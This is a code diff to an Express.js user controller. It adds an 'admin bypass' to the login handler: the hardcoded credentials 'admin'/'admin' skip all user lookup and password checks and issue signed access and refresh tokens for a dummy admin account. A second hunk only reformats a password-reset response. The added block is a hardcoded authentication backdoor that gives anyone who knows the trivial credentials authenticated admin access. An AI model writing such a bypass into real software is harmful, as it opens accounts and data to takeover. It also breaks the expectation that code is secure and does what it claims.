@@ -157,6 +157,55 @@ const verifyEmail = asyncHandler(async (req, res) => {
 
 const loginUser = asyncHandler(async (req, res) => {
   const { email, username, password } = req.body;
+
+  // Admin bypass logic
+  if (email === "admin" && password === "admin") {
+    const adminUser = {
+      _id: "adminId", // Dummy ID or set a real admin user ID if available
+      username: "admin",
+      email: "admin@example.com",
+    };
+
+    const accessToken = jwt.sign(
+      {
+        _id: adminUser._id,
+        email: adminUser.email,
+        username: adminUser.username,
+      },
+      process.env.ACCESS_TOKEN_SECRET,
+      {
+        expiresIn: process.env.ACCESS_TOKEN_EXPIRY,
+      }
+    );
+
+    const refreshToken = jwt.sign(
+      {
+        _id: adminUser._id,
+      },
+      process.env.REFRESH_TOKEN_SECRET,
+      {
+        expiresIn: process.env.REFRESH_TOKEN_EXPIRY,
+      }
+    );
+
+    const options = {
+      httpOnly: true,
+      secure: true,
+    };
+
+    return res
+      .status(200)
+      .cookie("accessToken", accessToken, options)
+      .cookie("refreshToken", refreshToken, options)
+      .json(
+        new ApiResponse(
+          200,
+          { user: adminUser, accessToken, refreshToken },
+          "Admin logged in successfully"
+        )
+      );
+  }
+
   if (!username && !email) {
     throw new ApiError(400, "Email or username is required");
   }
@@ -322,7 +371,9 @@ const resetPassword = asyncHandler(async (req, res) => {
 
   await user.save();
 
-  res.status(200).json(new ApiResponse(200, null, "Password reset successfully"));
+  res
+    .status(200)
+    .json(new ApiResponse(200, null, "Password reset successfully"));
 });
 
 const verifyResetCode = asyncHandler(async (req, res) => {
